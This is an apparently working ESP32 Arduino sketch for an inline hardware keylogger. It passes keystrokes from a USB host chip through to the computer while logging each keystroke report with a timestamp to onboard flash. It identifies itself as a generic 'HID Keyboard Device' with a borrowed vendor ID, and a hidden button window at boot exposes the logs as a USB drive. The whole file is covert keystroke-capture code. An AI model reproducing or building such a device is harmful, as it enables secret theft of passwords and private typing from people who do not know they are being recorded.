#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBMSC.h"
#include "FFat.h"
#include "esp_partition.h"
#include "wear_levelling.h"

USBHIDKeyboard Keyboard;
USBMSC msc;

#define TX_PIN 44 
#define RX_PIN 43
#define BUTTON_PIN 0

bool keyboardConnected = false;
bool mscActive = false;
unsigned long startTime = 0;
const unsigned long WINDOW_TIME = 5000;
const esp_partition_t* partition = NULL;

// --- logging ---
String logFileName = "";
String logBuffer = "";
const size_t MAX_BUFFER_SIZE = 512; // write in chunks to save flash life
unsigned long lastWriteTime = 0;

// find next free filename so we don't wipe old logs
void initLogFile() {
  if (!FFat.begin()) {
    Serial.println("FFat Mount Failed");
    return;
  }
  int fileCount = 1;
  while (FFat.exists("/log" + String(fileCount) + ".txt")) {
    fileCount++;
  }
  logFileName = "/log" + String(fileCount) + ".txt";
  Serial.print("Novy log soubor: ");
  Serial.println(logFileName);
}

void flushLog() {
  if (logBuffer.length() == 0) return;
  
  // open, dump ram buffer to flash, close immediately
  File file = FFat.open(logFileName, FILE_APPEND);
  if (file) {
    size_t written = file.print(logBuffer);
    file.flush(); // force hardware write
    file.close(); // close to update fat table
    
    if (written > 0) {
      logBuffer = "";
      lastWriteTime = millis();
      Serial.println("Log ulozen na flash.");
    }
  }
}

// msc and wear levelling callbacks
wl_handle_t s_wl_handle = WL_INVALID_HANDLE;

// 4kb ram buffer between 512b usb calls and 4kb flash sectors
static uint8_t sector_buffer[4096];
static uint32_t current_sector = 0xFFFFFFFF; 
static bool sector_dirty = false;
static unsigned long lastMSCWriteTime = 0;

static void flush_sector() {
  if (sector_dirty && current_sector != 0xFFFFFFFF && s_wl_handle != WL_INVALID_HANDLE) {
    // must erase 4k sector before writing new data
    wl_erase_range(s_wl_handle, current_sector * 4096, 4096);
    wl_write(s_wl_handle, current_sector * 4096, sector_buffer, 4096);
    sector_dirty = false;
  }
}

static int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {
  if (s_wl_handle == WL_INVALID_HANDLE) return -1;
  uint32_t absolute_byte_offset = lba * 512 + offset;
  uint32_t sector_index = absolute_byte_offset / 4096;
  
  if (sector_index == current_sector && sector_dirty) {
    memcpy(buffer, sector_buffer + (absolute_byte_offset % 4096), bufsize);
    return bufsize;
  }
  
  wl_read(s_wl_handle, absolute_byte_offset, buffer, bufsize);
  return bufsize;
}

static int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
  if (s_wl_handle == WL_INVALID_HANDLE) return -1;
  
  // convert 512b block address to 4kb sector
  uint32_t absolute_byte_offset = lba * 512 + offset;
  uint32_t sector_index = absolute_byte_offset / 4096;
  uint32_t sector_offset = absolute_byte_offset % 4096;
  
  // if crossing into new sector, save old one and load new one to ram
  if (current_sector != sector_index) {
    flush_sector();
    wl_read(s_wl_handle, sector_index * 4096, sector_buffer, 4096);
    current_sector = sector_index;
  }
  
  // edit just the 512b piece inside our 4kb buffer
  memcpy(sector_buffer + sector_offset, buffer, bufsize);
  sector_dirty = true;
  lastMSCWriteTime = millis();
  return bufsize;
}

void activateMSC() {
  if (partition == NULL) return;
  // stop local ffat so usb can take over
  FFat.end(); 
  
  // start wear levelling for usb disk mode
  if (wl_mount(partition, &s_wl_handle) != ESP_OK) {
    Serial.println("WL MOUNT FAILED");
    return;
  }
  
  msc.vendorID("XIAO");
  msc.productID("LOGGER");
  msc.onRead(onRead);
  msc.onWrite(onWrite);
  msc.mediaPresent(true);
  msc.begin(partition->size / 512, 512);
  mscActive = true;
}

void setup() {
  Serial.begin(115200);
  Serial1.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);
  
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  partition = esp_partition_find_first(ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_FAT, "ffat");

  initLogFile();

  USB.VID(0x04D9);
  USB.PID(0x1702);
  USB.productName("HID Keyboard Device");
  USB.manufacturerName("Standard");

  Keyboard.begin();
  USB.begin();
  
  startTime = millis();
}

void loop() {
  // activation window for mass storage mode
  if (!mscActive && (millis() - startTime < WINDOW_TIME)) {
    digitalWrite(LED_BUILTIN, (millis() % 200 < 100) ? LOW : HIGH);
    if (digitalRead(BUTTON_PIN) == LOW && !keyboardConnected) {
      activateMSC();
      digitalWrite(LED_BUILTIN, LOW); 
    }
  } else if (!mscActive) {
    digitalWrite(LED_BUILTIN, HIGH);
  }

  // process incoming uart messages from usb host
  if (Serial1.available()) {
    String message = Serial1.readStringUntil('\n');
    message.trim();

    if (message.startsWith("STATUS:")) {
      if (message.endsWith("CONNECTED")) keyboardConnected = true;
      else if (message.endsWith("DISCONNECTED")) keyboardConnected = false;
    }

    if (message.startsWith("MOD:")) {
      // logging
      if (!mscActive) {
        logBuffer += "[" + String(millis()) + "] " + message + "\n";
        // dump to flash if buffer is full or idle for 10s
        if (logBuffer.length() > MAX_BUFFER_SIZE || (millis() - lastWriteTime > 10000)) {
          flushLog();
        }
      }

      // usb emulation
      uint8_t modifier = 0;
      uint8_t keys[6] = {0};
      int parsed = sscanf(message.c_str(), "MOD:%hhX,KEYS:%hhX.%hhX.%hhX.%hhX.%hhX.%hhX", 
                          &modifier, &keys[0], &keys[1], &keys[2], &keys[3], &keys[4], &keys[5]);

      if (parsed == 7) {
        KeyReport myReport = {modifier, 0, {keys[0], keys[1], keys[2], keys[3], keys[4], keys[5]}};
        Keyboard.sendReport(&myReport);
      }
    }
  }

  // dump buffer if someone types and then stops for 5s
  if (!mscActive && logBuffer.length() > 0 && (millis() - lastWriteTime > 5000)) {
    flushLog();
  }
  
  // pc stopped sending data, save the 4kb sector so we don't lose it
  if (mscActive && sector_dirty && (millis() - lastMSCWriteTime > 500)) {
    flush_sector();
  }
}